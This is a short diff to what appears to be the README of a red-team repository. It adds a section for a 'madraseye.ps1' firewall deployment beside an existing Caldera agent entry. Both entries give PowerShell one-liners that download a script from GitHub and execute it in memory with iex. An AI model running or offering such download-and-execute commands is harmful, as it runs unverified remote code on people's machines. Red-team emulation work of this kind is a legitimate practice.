@@ -66,3 +66,9 @@ Caldera agent deployment via PowerShell
 ``` powershell
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/paradise.ps1') 
 ```
+
+## madraseye.ps1
+Firewall Deployment
+``` powershell
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/madraseye.ps1') 
+```
